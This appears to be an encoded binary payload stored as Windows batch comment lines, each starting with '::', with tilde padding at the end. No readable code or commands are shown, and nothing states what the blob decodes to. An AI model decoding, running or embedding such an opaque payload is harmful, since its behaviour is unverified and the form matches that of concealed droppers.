::]ukCgIfG+PLl5JR/!xIaZzTCU~~~p[P5gYs~~~~~/R;SL/QdNWqGi/;O-oOnQ9G5Y-v1+nMF2r^MGGu4m0/5B!7s;p/RTEu/!RprZ0XxQ~~~p[P5gYs~~~~~/Qd{)q_YB{qOkWxqP3BQM&.w}-v1+nmXABs+rfC&k/R;nqKl6S/QNlb
::U9!FUDH(HmBy~zn~8LGF1x^0{q8&WG~~Gv72{|Ai@J/G./QJ&kHB+j?1^4vLMblgZ}~OJXEE_brFqj^5FGqpf3TgP0qS7mO~~GWA59-2xfS~#l=pN_d}?C&8AbSErsZgfTAbSE6qLGZ?~~szfSsI,6~DxI!2He}sZz@8h~~Pnw31hdR
::qHNH3~~GS=1b_{I~T6KO6wK/z;2)vc~4bu9/QBnqqOMh&~~GSZycfSTAbS-z~~~~{H~hU-Bh={a~8LG;;1-Ej/Q}foG(g{pP(([N~~P?E8n^Y^BBtskGS$fAP?|h.fA@wQAbS-$|Rya8?ujlX$A(kiTt7@)4${CCsfW(}-E|xSk1V@0
::Aote4O^EK7m3lqkf_,]SBMWT6P5gYs~~~~~/m^uDq_#6l6_0]h}?_Rx)J_QKqHnP~~~GU|]1l8MqHnzD~~GU|)cuqTIfYOE{OWM/D7~&D~wwTe7.xsY)_f)C@n-]tk[Xr}c/sGAB6AjoBBc.N/R!ih7W?Z7qrL5V~~sT5qiOF(|n@z}
::qF;{cqPwd8~~GU4PyMXV;cQU1~8fDWk/Rg~-wK87~4b1iD7~vO~wwTn6UsfhZWyyD$a^l!~pJXP~~~~~HHHKqZTv]a~~G&nL54[7qs)5c~~G8H)|7+n/gs.Sl-tNuy#_hRHP[(O{L&,+I+KAht3DO4$(yBupiBn;7WqQQ$L8wu~VrP!
::Pbp3y~~P#?~tJNWTww9P.a,&[|diTD.?7jk{L^9G+D(;J~RR6GqF_!WOiU)+.?t}]Z0m,]~~Gv7{98kX-hqgxk}B(M~~GvpIfGf2L(1^Ik[Vt{[BH!_~sDTwqHK$g~~GvY[1csn~DDVXHe@H{B@rC?HPBFV/Y}_IlnKX4N]&Ms/QB+n
::$hro+~8LswkP7@5/R!(5DHzCm{^~pp6R$V&qrlD}~~PIN)jS-0pP_@w/Y}=?6Pu0jiurORDHzfTIDify=PSR,.^DZVG~?,H~~~~nq{7Jj$0aNH$(FnMEZim2?X=P5~~~~K=Gd07m0|1#mml?Do(t9z}Hea@w(&V]~~GL#P1jJ/8GF=h
::~s/9x/Q-&v3Q^_//Qdh}AG{v1k[^ju[by;F/g@iBp{{-l~.y(M~~GL]i8sKS~TTUqB?d,1m=XZj#^M9S$(FdC/TO80/Q&qXAG{v1k[&3JB@62{iV|XQHM6[u}Ha[=.a56zAG{v1$by);qGK37E^I?S~~~O~4w;f+~s/9S/Tp9/M}8rj
::qrse[{vxdIk/uR7pJcE3~8dV!76Md-)y_3D{P[O5?uz=g_6twy~sDQe1oPOn0J63tqe5hY/Qpn4}~E?{}~&C4I+mlfPbGXUk/uRp4bU0_~4cIo8e$x?KAnl34kA6=~8IFJ5ABew-bVvSk1tc)_Y[{[~8lxuw(vQX~~GL#P1jJ/4Npao
::~s/9x/Q-&vzan4(/Qdjk2S)Yk/Y}I_B@;zLiooq?k/uj!plC4W~~~~~~Bos!~~smFk/RU=Wvtn.$yXB8~VS|F6Cb@?{La=Fq4r!h~~GS=1w.@Q~poK_-k09=kU7=.G(^y!zA&kQEJTy-)hNvX~~~pRNcIy][bnFvqrseB4C^z|~8LO+
::mG^mudD~Ico.qO0g!0J=~poK_E[2xSkPOhQ/RUp(/Q&CK2S)7/If0yMC(LJSqH5^]~~~uAIRKIuk/uo$M]NNF~~Pw[w(&|$~~Gv=4y_j=~s/!9)J8Yk4i+HL~8Q{N.^gFlq?f;wF0l$sM}8oLE8V+&kUJ]L$qQzAk/^b!qO|P(~~Pnw
::2+6aY_1C&X~.yy!k/JTefKyQ^fKyQ^fKyQ^/QJ&k8K{JTMblgqMbi.v/T4_wdD~Ic/|NUSG}BLiqo5Dy~~GuWL8MLzU.+KWP+7y~}6PpApo?OZ~8Qf8/QJ@)}UY#K~~P5=1rTV&/TH^2~RR6[V0m{4~~P-XHgQ+6-_[mc~HZcGZ$p7u
::~~p+4}U9!P~~G3)EKIVn~~GvY0JBulq(Qd!1jfPhF+_v4zY~4M0J[&-0J[5k0J6|;0J6pp0J6VH0J6S7qgqT0w(avE~~Gv7{9F&S1_RX.GEfRK!S&ZXlnxMGqfW2X/TO4;mG{+t/Q^IrUc9fL#W&/sZANu6m9B[j~~;O}z0J~j$(y6K
::]@m~j.]U|t$by39w(hce~~PLv)x,oDPQVk1~.f4Kk/uj!IG#Ymk}!P~~~~#[ldkQKv-4Ck1_r[,e[VV;.^Q$V_N&#h~8LO+w(hcd~~PIN)J|^bBK|2t~|U7FZ2MPV{OI!d~TT;p/Tp9iB.1tP},v5J~~~~^{?T;=!tmAWqf^&,lnl!K
::4,+fQ~8LsBS$@D?EaQpK0J!l-Z2MP;}U]#1~~GvY0J!)7dK!Hs!tmAWqf^&,lnIlT4+|8_~8LsBhRq,Cw(a3N~~Gv7K!|E!ifn;umGa-3Qp#Ie/TpcUMv2d^ZzWIt~~sBW?Ae5xG}1A]!S&qYqCYS=ZT$c=~~P5_1JCsQ{r85D/QJ&k
::U&ppAk/ur[LQKEQkO/LfP(,Jr~~PheaB7xa,174)$A}1-=qO_+~8L$/ZVa1S~~G#EfMl3-qL~_B~~GYWfh6wmqgqQa_CAd[~}m7vz.D2P~B+9,~~GvY0J!YE4kt2y~8lxi$(FNm.^DK}MzNlh_Cq56~8I{h~A;eNfE/Ai!S&q=q(K+k
::lnSKaqb[KrqXivkm0?cLq?7Q3},Z,[dleR9~~;O}c[z[C!jIm^~w5p@!HFQ)qkboP/Zj5O$atj!~8Ls=lw7,o6~44r/Q-&+4FrMS~D/6~$#)bL~pJXP~~~~~/TOj./R!x_D8_cAUPgsDHPQNx6(sr2PmE1e~f&DV),f![EZ7}=$@BV7
::{CDd-/TORf/Q-fSPy8vSPyBZkFGQ4i!HFTVlndPvqX8p[$A(wI$C=.w~8LOyw(x2d~~Gv7[8;HQ~8ANn.^g?]0J!IJK!|{41^khlwQon(4w;q{~8lxi$(FN@mGv)T/MUkg-,]#,~8LO?_Cq56~8I{h~A;eNfE/A_!tmA$qk;SClnlsa
::qNvd9.^D}O+bZKjqXivkm0?cLq?7Q3},Z,[dleR9~~;O}/[|D)mGv)T/3,_d~~Gv7PcV/M~Mc#m~~P-41jAc3-xT1T!jLK}Hgs_bqy-XQ1jfPhyW{}KXLx[)B[IhITRLzPEP.~|~HZP?Z$p7u~~GTiGv{bU-{T=,~sDQV|+$fVm0?c{
::q?=^h1JNMs~~~~nqgqQ$_LkP,~T6eJXLx[3cUM[K)^-T?Fkg]Qqic,/~~~~n$09&rP,yq@4?U#3~8LP2/QB5Pp_z&$Eu(f41JC;0fhzG//Q^IrU0IYxE[|alw(^bQ~~GSZ{P[[=~~6gG_CLO}~T6d|!tmA2qKlBBEVo!T~8p9G~~~~n
::Z$p7u~~p+4mG@||/6kL-~RRM{EMKi;.^8dPcCqNpqiUy&LedFWgiLd2/QJ&kUqOf/~~;O};HV3y/mxV2lnSK#qb[N8/Q-ds~RR6G/Yr|!P,yq@8G8W2~8LP2/QB5Pp_z&$Eu(f41JC;0fhzG//Q^IrU0IYxE[|alw(Rk.~~GSZ{P[[=
::Hgq(M_CLO}~T6e.!HFQtqKlBBEaQp+pR8fZ~8Iwm1l9@(1o)d3~~szs{OI!Y~TT;pE#F}U1op=c~~sT5{OI!_~TT;pqNvd//QN$Y.^.6JB^W7@.];-6!Rf7h1JC6@0J!YJ{&?ZBMk;~F$5p@&k1!(3zW@Wo$iw1A~D|)L$^v./~8L8h
::;H9viw(a~R~~Gv7{9q|;?7g2Yw(vQ4~~Gv=P$cXL~8IFqRU0wDw(vI6~~Gv7{9q|;ifAN=w(hsj~~Gv=P[JKG~8IFqurkNiw(hqd~~Gv7{9q|;50OS/w(RNB~~Gv=P2_8,~8IFqM_X?Fw(j}9~~Gv7{9q|;-xT1Tw(x#e~~Gv=P)}dX
::~8IFq}(Y0bw(xkF~~Gv7{9q|;Nf75Xw(J/c~~Gv=PtAM{~8IFq~UCg!w(J_q~~Gv7{9q|;{0;IFw(abw~~Guq;zY3h~8IFq52cM5P(w,7~~Guq;^iwM~pjfBGE5ww6@0_c~~~#ILkAIW/6PSbc1E^@$jFYn~8INoP(F!?~~GYcwkkN@
::~TT;5Z0[iC~~Gv=PW;Tm~.f@+k/uR=Tuog$~TTgp4?#r3~8L8vD63yB.?YF_q;wJQ.^.$MB.19uZ22j?p.c$H/TH^@p./3,q;wJ6-od$^k}[wv~~;O}lf1^emGan#Z06=G~~Gv=P||Nn~.+GSk/uR=P6,e6~.N^vk/uR=Pc1vo~.NX3
::k/uR=P3Nr!~.K{.k/uR=P$c@e~.Kzgk/uR=P[!SO~.ey~k/uR=P}O}Y~.e]5k/uR=PQ&i4~.ePlk/uR=Pzl0Q~.dx&k/uR=PtAWN~.d[)k/uR=P)m~}~.CC|k/uR=P7s#o~.C@Vk/uR=P$ctK~.fipk/uR=PX7^5~.f$-k/uR=P}O.]
::~.f4Ik/uR=Pz|s/~.{jak/uR=PA#y4~.5|Wk/ut2L8MKWU.+KW/[7$&_V/v0/QnbL7gvHa/|eSMG}BLn@J/~{0kxIH@T(7$4(M{i~8Q{_/TpcRM}8S7?scr+=Hxr|cCQoD/Tp4q[@6{cyCH&N/THEWp./3,Zz)L;~~s}v,D&sxZ$p7u
::~~sBIPXgczz[m9d.bH&M}U9!P~~~Zcm9T.=so^-6Z2tF+mciBe~~Gv=4N5fR~}m#/~RR6G!RKh6BzN]B$(FNQ/Tpj/!HFz@@[-RRDY0C3Z2MP;_Kl(v~8LO+w(&l$~~PIN)J|^b;]t#c~|s&mqfW2X.^Q$0/QJ&kgift^~~~~^d&SBp
::1J~UPy!U7z/QNVeta)}3VKJmpDgGo9Z@s{+~~;O}fJLI?/Q-FKZztyS~~G3)I~Hw1k/x0h~~~O~4iNY#~8L;m~~6gG/TH^@p./WCa)O|J$(FNuw(J_7~~G3)ldkWphxY!h/Tp4MXsbp.Z.NZAEhH+$$LADa~s/tn.^.=E!HFQ)q;wJ6
::_CLO}~8LsAI~4FYk/uR=TuxVf.i-FF-rzW-/TO@[w(Rmx~~PINP(F!K~~GVE~TtyW$xeI=~4Z!0~M$Ub&K33NqiupaPW;@/~.fR,k/&I~1rlJ?9+[hx/TO@o!j_a~Gv{bUP+x[^W58F9~~Gv=$LADa~s/tn.^.$.!HFQ)q;wJ6_CLO}
::~8LsAI~GU5k/uR=TuxVf.]UEI45-c=~8Ls21lt08B276n/TH^D~RRM{G-PL,w(xmh~~G3)ldkWpH6Xl5/Tp43DChy/a3NVa!xnmYwxb,NZ$57)~~Gv=PXyEy~.KPpk/uRY0J[~?ZzWa3~~8Hg1JeX2~~GWA{r7GO{OIXF~wwTO_CQl!
::HYT=OV$tY0qO.7h~~GSZn8D=FwkkeRp./3,$(yBu,$T=n/Tpc2[bnF=Zz)ay~~sBDEqiEqqi2#RG}BL(q(K+FFG0]Sw(hqI~~G3)ldkWpNC1.}/Tp8=DY0emF~P+h!xn/#wQodR0J6~CH66b9|5~U;0J6/o$hPTd~8L8hK7n5[-NDqy
::kUJDNPyxSX/TpsG[bnktSS?]w}HjQfZz)QF~~sMfE[JCuq?=^h1rL)x_Y~X9~T6d7V$tY0q(K+klnlf5ZzWI3~~sM|E[JC=qF!)hP2/p?~.eJ5k/x0x~TT;C_YA,B~sDc@1r{XOCJ~#Kp.X;bVX49PlnI8kZz)Dy~~sBaE[JCaqiqAT
::8f1=C}HjQfZztff~~sBQE[Je70}Ul8qKlBu/Q-N?8H4gR~8ANCqgqT}!jLK}HgsI!8G8DQ~sDz@/QB5P4qU[,2Cq]F--)T9kP79t-,V|n~8pgb~~~~,Z2MPp/R!-rZA^Kj4fQIy~D/B[;2bD~.$T8v-KQ?ekPDg?w(J+$~~GSZ?t)&O
::~~PFs1r{6PCqyR!VX49o71Kv=Z2Fpd8~c~;~sDz@/QB+n$Rp-Z~D8|^W0Ztq=Ho}a$2/+IVh]X5)TGwP~Y_N8ww]mm.^.7l6R$XW2e^K(hR[rLEjZx7PQVrO~|;KlZz96i~~szl.^.qQ[bnk3/M1~uOip9NE^lPPG4Qh&wk;RE$AbB~
::8uAfe).(jGPWk[Y~|8+HZz3EN~~szH.^.=96R$XWHM/H,}?-Q7EZlU2P7wgC~sD9JLHr-b_5gMF~8LO+-N?y|~s/t-/Tp4h[oZn.K48S7k/u$))T5mm0J[b&$x/cW~8L8{@?7HC/Tp4bVKSaMrgV7+/R!ii8PRdv~Di9!T~6!O/Tp8u
::[@6I7q(EqO-u(vvZz2yD~~sM0-u(vvZzAzQ~~sM[-u(vtU;=VdP5gYs~~~~~qiphZ4qDKY._X&9P+qV_8+#Qg{|c-x1lc-5H#+=QLCRpeqC|kY/Q-feq{LVeITZLTt3eW|k[g?@3E8c1PMXJ0~.5iy~~GG{1oGGsx0iaw/TpcD[@6I7
::Zz3ER~~s6+-u(v&qiqAT/!UtQmGJvbxb,Gp/QE(FFL1=|cQeCsZ0UFiHM|j_ydC|peen~X]LZO6.]UE&P+x}dMk;sD6-!OH=-(KNITq1T{FO^X)RTw6TOh-V0J6S$qiqATUz9g+7JcIZ~kHtP)x0|iTOo?hqi2uHp./YP{GC7;aB7xa
::TH#lx/Tp4!V$t7BWn?HUEjA-o1o7-l/QNVeWxdC.Z2p6x4fQ_,~D?[iZzc@/~~sMK-MhYuqfW29!j_rZ}B5D6yX_[./mJpBqi2Z(p./3,Z0B@X~~Gv=PW;OD~.fR+k/xty/Tp43[@6{94lGWFPiguQZAm[3dv(c$~RR6[H#r,+-{L2K
::~8L;4~~6gG_CLO}~sD9Sgyu3~/Q^IrUc4x+k/Rg~/TO@o-hijAkPH1=ldkWh1lt08T;^A4/TO|NWE7=M0vz{iZ$~?0~~s}S-E|oaqi[[.Y,aNy$(FNc/R[8+Zz)LP~~sM)5?0@#Z$p7u~~;O}Bz!PV$(FNJw(^/F~~G3)ldkWpg?F0V
::/TpHfVX4c6c335-!xn}eFG29fZz9d1~~sBr5?0@|I~Ue,k/ZJ[ldkWolf{As_gZg.~p^oX1lcuP4;HG4Z7V@}~~4aM~TT;yZzt[)~~GvY},Z,Y{[PL^k/uR=.b1(=5?0@#Z3;ffZA8Jtw(JAF~~Gv=.]UEI4-lIZ~8L;D~~6gG-xqYH
::kPHgDHgq(Mw(Ju@~~PIN)RJu(SY,#jmGan#Z0}fp~~Gv=P.-B_~.NEuk/xty/Tp8T6TX42R.p~hw(J_2~~G3)ldkWpX7L_D/Tp4Mgn{/[Z.8Oz!xnm/iS8.y4Eucb~8Q{_/TpcDgn{}TZz@9W~~sBk5^G/32cmCVR@[;@$Y=}i$Y=}i
::$Y=}i9Z-du$Y=}i$Y=}i3of0ltY&.^$Y=}iVne^n$Y=}i{wJZI$Y=}i$Y=}ipR,l3$Y=}iYEw2+$Y=}i$Y=}iQtuw0.aEVI8eKCr1^iGCTIVEXMhgEOkPDVB/Q,pDB?h$S]ksd9TwL7J/QM7H$at]1~HZccqHc5|L49jm075~NY,2rg
::N7~YW1xxC$YZgob)TEUiR/,ij.a,5|gF?vA.^gFlqgqQ$/QEPnqr[-U{^QAx|{vDt.^U~TXhVMLk/&eNPy#Z5l5O+nvFXToW/M}@cwV=xq?DsAY,2rt$0lGS@~W6hqHlbxY[y[G/Q+596Dfr)$0lGS@~WB5/QJ&kGh.e?1aBO7$tkIi
::$38buw(x2J~~GWAldk2s/QEUdZA$oJ4-/YN~8Q{fZ3!l4qis1/Y,/J-mMZH)|M+LPCiRK6/Q,.24-lh=~4=Wf~MZI=p/Q{X@,0j#.^gkH~TT;p/Q-urqF7P3;Oh)LmG^4wGv#ns/Q-r-4KV4m~8cSCmG^HJqiupvid4,[HYT]Cz^c)f
::p./WQ)=YyzWyN/yu^iDVqiupaPT)t1~.K{Vk/uR70J[~?q?acY)Tn+|$0_,0IiO@$.^Vrk$2~/tqo,ny~~GuWL8MIv1oE-T/xiU8/QdFoz.HzFZ2[?Oq;?RJ_YnX/~8nGmKj{X)[!iL&1h!=d}K|#,}CInh}e$)]1JL?b~~G^]}f;V[
::1J6.+$mpF/~gtX}lnJcLq{aNJ/QNVez9f}E-N?FQ~8I{_to4nfEEE3XqiupaP0gqT~.n-Xk/#,5/QNVez9f}E-Ch;+~8I{_toH4TfKyQ^fKyQ^/QJ&k8Kkmo,~?4.~8Lp#owOK4/[7!^q;wx}/QE[rFT[GSk/uqAd&ts[mGqz0$by3i
::/TO)#P5gYs~~~~~P+$8rP(Qa!Hu#Y/B6s]&/QK-SMhDL^Xu6A{)3NU#ldk;i8eO#H3y6N@fp&j-1R77R},uEVq1hLa}U7;T~~GvY.]UGRp.|T6/QdF|TwLBNq1hL$.aEl?U9F@|1o,LkTOog7qgqT)w(va~~~PIN)j&[8pT,NWmGan#
::Z0.-b~~Gv=PcuX$~.5)@k/#,5E#}zt.];Xi#=uQ-~~Gv7.]U5&!j14K~wwTEq5bHC~~~~n7S;4z~~OtA/QJ&kUtQYA_cX6e~.e-2~~Gu@n8DfXjccEk/[7!^q!dVhU.[2Mq(KnONVmVE!j_a~HeWO2/TO|N3.7(d~~p+4/THv&#|xtE
::}U9#z~~sBPPKC^Gqrd#8~~Gv=},vVw,mT8J1jzyR2{|b}Z2MOR/Q^IrXhXd^[!yWo},vLE},#DeGv#n,ZA!Zdq;wJ6/Qxl0/B_a&1oPON0J6)V2{T3N4d)-P~D/B[U?L/LU^q=!qy+E24CD_1~8L8hROQ.t-vtC2k}}Xx~~Ph~1rlEN
::$^bZQ~8LpRBtQ)l/TOpIcBxuy1R77R},uGNq;wJ2}U7;T~~Gv=$YbR5~~8Hg1JLks~~4^8~HS2pq;wJ6/Qx)}MhgLo1h!]I2{Q+7qgqTVqDBW7w(J()~~PIN)R2Aw7XBNEmGan#Z0m]X~~Gv=P6Yei~.e{dk/uCu.]UlZqi-9o$YbCy
::~~Gv=P.GPI~.dfYk/^aX~~~~nqn/iCU.[2B!j1HG~RR6-q5b4KU.[2B7S10Y~~OcB@1#y!fKyQ^Mol}u/QO/[/QdR+|t!cC!R[+9},uQkq(U+J1jQ0X~~pNkS44Bw~8QKBOZ25r;wE|6q(K+klnlyP8G=sM~8Q{_/Tp@s!tmAWZz2z_
::~~s}.+o;J6I~1ez~~Gv7K!|{41lQ1ew(J1g~~Gv7K=JI6)jg?OJL^&|mGan#Z0Qp0~~Gv=PmQT0~.NO[k/#,5-F31T~8LO-/Qx)}QGIm5;wE|6qkk/-lnlyP4EUE-~8Q{_/TpcU!HFQ)Zz@Bz~~sB?+o;J6I~!2n~~Gv7K!|fp1I15i
::~Hq{k8G4CX~DiHilnlyP4eljD~8Q{_/Tp9^!HFQ)Zz)Dx~~sB6+o;J6I~D~P~~G&!},#Wd~~~~K!Rdr;1JeX2~~GWAlF4=W~4y&,1^,gN~~G^$CqyR3;Rv![q(K+FFG0]ow(j;U~~G3)ldkWpTHU)&/Tp8OU^qZUd1p{P!xnTh.^Ql-
::MhDiL1^,4e~~G3)L2uiT/Q-N?4+.Q)~D/B[U^3!c;Rv!Vqy+E24KV^)~8L8h!{sn~-Lz&pkp+]x8747!w(aSh~~Gv7fuwQG;Rv[q~TT;p/Q5ui71Kv=/Q+&/|e}==1lQ-T.];Dp!j1HD~~~~n$0l-j@z!J?fKyQ^fKyQ^fKyQ^fKyQ^
::fK5r[P5gYs~~~~~/6m/8.LuX.HB5j&H/8rvk/&6tI{FxCH)O!w~~8}eMo|BUEEL+0~~~GIjihBX-n[5]~DyFlK)Poo-KjD!~D?=yw~Z$s_Ysr!~Dxvx}5;7n$hx_Z-xne7~8L8h2l28c-+C#A~.NgS~~PFb-S]mM~D/B[QRk+o~~s}.
::p?yjRln^bJZz2z9~~sBrOZ=!5agcwy-{s7&~.eDP~~PFb-L}s#~.Kpz~~P_K).J-NOZ=!5|lgyp-&Vjw~D/B[GpjtfUtb{?G}BL8-CB,K~}nr[/QOmR-rUq?~HqAS$0S!J/QOmR-xnf]~.f!H~~PFb/QpnD-wK2a~}nr[/QJ&kGh.e?
::1aBO7$t(QH~TT;p-x~GT~DD1b$7nn[~4nzMMIkqgU&PhL~~P?Dqrf(=~~Po]~zknV~TTU&{LJBwpfXc=~~;4p~8L8{g,H3+/TpHf;wETsadWW($(FdQ_WE#D~.wD|~~Gv=8O@xT~8L8hCEZDe-Sr9}~}MmDQGN&(~~~GfGjWN~MIkqg
::UYpcU;~@}c-edv8~8LPG/|wEP)T6b[{v&=A~~P_K)|Fpbld6wx~SVF+qoL(?2LRvx-{wph~8LPG/|wEP)QV.8{vuF,~~P_K).-3FON.(C~~s6fO6!Hkq(E$lO6!Hkq_(j?O6!4pq?acYdbU=Fy34SqqF]m1p?yjxlnR&c$ItZE-vsp5
::~HZ4V~JgK-~~PFiEuhRM-{qfx~DDVXBUqS8U.}ZK-n[k=~DyLCqdVq,/Q+&//B_t#X#qLVG}BL8-a5r;~X)Iw~~~GIHgRP}qi8zYGE5keqi8z)GE5ke/QOmR-N?y|~8I{_Vghd#k/JTeMo|BUEE_nRKelfq8G4og~8LO-w(j}1~~;O}
::0^6h2/Q-&GG,|mA/Qpn40zeC@h^~vt/QJpCGh.Jm6B^+;~~;O}u^4^H$(Fd/_Y[{[~}EwLZz@=y~~sMl~~~~nq{aNq/Q&ZW.sywIZ2MO#/Qp_L/Q&q1.sywIqow;M~~GvYpS7py~8LG.1jzyRpSyzk~}M}i/Ca+(p.@}jpjCyt~~;4p
::~}M}(/Ca+E~~~GDGv#ns//Y~9/Tp4g/CanlLwEA3~~~GDGv#ns//Y~9/QdFK/Y/LSqUeOi_gZ4m~8ly9~AHUjaBZ__/QJp2U9F7OUT|)l-E|hlkPPd_6ML({Mo|Sf/QOm?/QE!O8PRzA~8LOaiS8.?!S$,pldkW{1r{XOCqyj1s@.fV
::$(Fd5/|()b[bE=D.]U|tqC|kX.^g(IqUKX$.^gySZA8J|/QJpCg?/(.qgqQ$w(J_/~~;H0$AbpGh(XqCMr&nPIiO@$/QOmR-{sqa~D/B!UIz6HpzMLP~~Gv7/gyqf/6zym47,u?/VxkmaM4P{),IOG/QpnDIEk!giRJ-;Mo|BUEEo+]
::pCG+v~D/u1~TT;pPyUT-p{TSc~.N~j~~sMw~RRB&lnSC/I~QSbhvzes$hxl|!Re5R~RRMdEc37q$0_,|IiO@$Mo|BUEElNcBcW-x~D?Zvtmi~_Wc@9@p?yjRlnJbhNZzCBZz9BX~~sM/G}B{jlnl[oZz9=/~~sM8G}B{jlnx!{I~TdN
::Pwxjsso^-D$@Bs{P(zCJ.LuD{qOTEv~~sJO]N1NW~~GvYpJ9dH~}1[n.LuV?hvm|]LGw|P_YqkM~.dI5~~8}e/QOmW.^gLk.5VqkcnJPo{/CXlWjbT&;}cXr/TpcQ{/CX!p6vX^|d-@{)lqRd~RRBB62U=sT8yNoHPz+z/TO]L/g96=
::r,|6+Zz|0[ZzTkGqP+B1BBDgeqfB2#B[WF3q{9r#IUowU3jM6NI2B{g!j_N7dRWr7I~Q_eY}L$zp0rdhO3kvkpbz~r~SPul$0_x3Mo|BUEEI[z-nR;=~HZHRln^kQNZTLE=Atel~~GvtLGw|PMo|BUEElNc?!^1{~DKY#pWW6WPg^aq
::~~P?p-Jbw|~6C7i$0_,|IiO@$Mo|BUEE_n#B5YIO~TM^7KEruL!4&lhE#v#3dyGYg_BCEH-a5lU~HZHRldyb8dyGA}/Qpn407y_D/QOmR-eOEikPsy|s?[BGk[rLLLOn#]/QJ&kUt|k5EibCFU9F2?oi-GF/9ij#+l(}Y~~Gu#IKlHE
::$BuEp/TOz_w(R}{~~Gv7m[a&um!K7}_D11)qy+-Tm!K7}o-nStqy+E2.Cb(Sm!K7}jQ|5|q{_{oZAXk^IQYW1!]R3R!]x5W!xEx,k/Rg~k/Z4~/Xfwc_q$bQDj_;+~8S[+/Va1s/Q&=sm$T3oqdVqb/W27PqOBee~~GvtLGw94!xN?u
::_1C&X~M,Ps_1_f?~M,Ps/Tpsa.sywIk~/&p~~8}ehvQhCI05ar/T~K2.sy(X/QOmR-+pcfkPPf715z25k/uRtGvdu=LOn#]!xC~aCirimH~jE]/T~Co.3M8!/T~K$.sy(X$ge4O~~~G|/QJ&kGoj3^jTl8Vk/uR9,8LCs~D?#98tz)/
::w(RKi~~PIN).]Z)fiN!;~~~GILQKEQ!j_N&|P!YhCn{z$-&9ji~8LsAyW{}Z84p0;q-XH6~~Gv=vVv60~8LO-mMq{o4kccv~8INo)@3;YcX{1m/THxep./3,q5Q?(~~GSZ{9qVS1xx?qI{?CY-v2-C/QJpCgF$zEyB/2X1^yyfw(^1S
::~~Gv7$b{ck~8Ls21oPON=OD=|~HZP?Z7M)x~~GTivn];d/Qp_L/QRPx~~~GI)?Fl3/Qn[2p./3,q;wJk{OI!=4L_M~{OI!u~TT;pw(RtC~~PoY~AH[T1oPON},uGNZ23z]uKOP$},uQo{?TUm4L_MsZA8^Iw(jt;~~PIN)JRwj)J6k(
::p}d7bk/uR7aXoWf~~Gv9LBbZx~U~=d-w_y3k6Dl[/QOmR!RKh6{Qpr^/QB5O6-mkN~~OJ-GlPNE9y/lvp6@O&|d-@{)RymH~RRBB62U=s8M4DZ~~~~D)F4smiS8.?~gc97~Jtetldk;wVsj.v/TpHf~~~~nk~|/u~~8}e/QJ&kGo5v=
::EE_nRsUS_S7Z]9IAQS#x$}y)T)xS,}UYQ~[F70QYiS0J&7fK96&DF2z/QNlbX7N=/$0_,0Iwkx,~~GvY8etvEG5zax~~GvYs~$;A~~8}e/QJ&kGo5v=EE_nh;^7l#~8LsBN{w=UE#E{YpP_gS).I{rY-E_l/QpeC/60l=-(OIQ1xxCc
::LGw)s/QJ&kGo5v=EE_nh;#dJG~8LsBhJ?+^E#E{YpP_gS).I{rMa{0p/QpeC/60l=-(OIQ1xxCcLGw)s/QJ&kHB+hp1^4^&$tkV;lf{82JgkiJmMZrdqipAQy/T0o2d3jtmFY&_mG^$#y[HXuZ2;I/OCn5v}Pa^9A]E2wpzgAAfs49$
::pY6sB.]4yGTOxEi|e}67d,zOmk~9D~wkF.VpiplWgi|wt~RrTCBL2^1~gtUIh-eBk$A}&M1hMYY~~;4G~~~~nHG}kl4=rnI^=SPI}PdMomGQsB/1whJGz#]&Z8Ti$_g3~}~8QKQFL)|ig/R{aJM.~bmG^Kx0JXYD.]4yGTOx-ISH#;T
::O|u@zmGQ8q/1wh!pr0T&~~;4p~8QhvB9XG7HPliTP(Kb3~~G3APBz]t~Bw)/~~PnwU9}HVHPli2);aQg-/_u{!RlVVCFspBU9E,e/QJ|-U9FAh1^yQ$6E@scqowoQ~~Ph,GKd1gMElEe~~~pJpEA^W~8OzwU3^aF{T/q1{@SeUp^aZH
::qO|,f~~4qD~~2a.1qM2WKvcOPq{aNM1n2K2)JLkBx{!|IMLOquMEl,JqdVqJ!xCu0)Tnu[$0_zVIiO@$!xC~avi2SuH~{w7fKyQ^k~9B$~~;O)?)Ig8k~99#~~;O)iI~v1k~Q(s~~;O)cVyF2k~|17~~;O)haV~|k~0Mn~~;O)LpZUZ
::k~Qm5~~;O)lI}_7k~T#.~~;O)Y-v7rk~@MX~~;O)UQBI^k~Tm!~~;O)TpK}6k~|17~~;O)g-C&_k~@hQ~~;O)f&k,Jk~0se~~;O)~GG0Bk~QUK~~;O)DDH~Lk~/gN~~8}e/QOmR.?A|k/Q-xlqilI(~~~GD~TT;p/QpnDIiO@$Mo|UX
::8etaz}PeB,.^VphiHWB+qioxr}H&b}.-V~HijnVcdm9CN.]PFxcH2?k4W;Ky}u1DYGh.-9G-Nje~(^7SHPB-1p1GuO.3R9X!Rn|]{Sy~v?Ae5mfKyQ^fK5r[P5gYs~~~~~/QOm@.a5YD.a,ppGhd1X.^T~k8eC]1.fXa0cucpP1y=Px
::~sMv83bH9&7L}_~.?hxtyWnqaLRY6/BBc@c.^4^!.^;VOGh.^dHcbL.fKyQ^fK5r[P5gYs~~~~~kMQ1)fKyQ^fKyQ^fKyQ^fKyQ^fK5r[P5gYs~~~~~k~0qi~~G/{/QOm#/QEf8qoYc1d07|?.LW8E#9hGtU2[yDMo=9ME|@N}!Rf[g
::p^auTH~jyNIg#(H~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~?v8~B~~~~~Nn3WF~~~~~fHr#I~~~~~_/FRq~~~~~x$[IQ
